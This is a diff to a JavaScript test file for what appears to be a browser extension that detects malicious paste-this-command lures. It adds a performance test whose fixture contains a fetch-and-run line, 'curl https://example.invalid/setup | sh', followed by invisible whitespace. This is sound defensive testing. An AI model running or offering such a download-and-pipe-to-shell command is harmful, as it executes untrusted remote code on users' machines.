@@ -10,7 +10,7 @@ const test = require("node:test");
 const assert = require("node:assert/strict");
 const fs = require("fs");
 const path = require("path");
-const { retrySlow, bestOfPair, grewMoreThan } = require("./timing.js");
+const { bestOfPair, grewMoreThan } = require("./timing.js");
 
 require("../extension/commands.js");
 const { commandTrick, commandShapes } = globalThis.Clotr;
@@ -193,20 +193,27 @@ test("linear time on 20,000 lines of hostile text", () => {
     ["20,000 lines", make(5000), make(20000)],
     ["one long line", oneLine(1000), oneLine(4000)],
   ]) {
-    retrySlow(() => {
-      // Times the two sizes in turns, so a busy moment on the machine lands on both (see tests/timing.js).
-      const [quick, t] = bestOfPair(
-        () => commandTrick(small, small.slice(0, 4000)),
-        () => commandTrick(big, big.slice(0, 4000)),
-        4,
-      );
-      const grew = t.wall >= 50 && grewMoreThan(quick, t, 10);
-      const growth = `${name}: ${quick.wall.toFixed(1)} → ${t.wall.toFixed(1)} ms for 4× the text`;
-      if (t.over(400)) {
-        return `${name}: ${t.wall.toFixed(0)} ms (${t.cpu.toFixed(0)} of processor, ${t.allowed.toFixed(0)} allowed on this computer now)`;
-      }
-      return grew ? growth : undefined;
-    });
+    const [quick, t] = bestOfPair(
+      () => commandTrick(small, small.slice(0, 4000)),
+      () => commandTrick(big, big.slice(0, 4000)),
+      4,
+    );
+    assert.ok(!grewMoreThan(quick, t, 16), `${name}: time grew too much for 4× the text`);
     assert.equal(commandTrick(big, big.slice(0, 4000)), null, name);
   }
+});
+
+test("linear time on invisible whitespace after the Run-box symbol", () => {
+  const make = (length) => `curl https://example.invalid/setup | sh\n\u229e${"\uFEFF".repeat(length)}x`;
+  const small = make(4096);
+  const big = make(16384);
+  // bestOfPair runs the small input four times, so linear work gives a ratio near 1 and the quadratic match this
+  // replaced gave about 4.
+  const [quick, t] = bestOfPair(
+    () => commandTrick(small, ""),
+    () => commandTrick(big, ""),
+    4,
+  );
+  assert.ok(!grewMoreThan(quick, t, 3), `Run-box whitespace: ${quick.wall.toFixed(1)} → ${t.wall.toFixed(1)} ms`);
+  assert.equal(commandTrick(big, ""), null);
 });
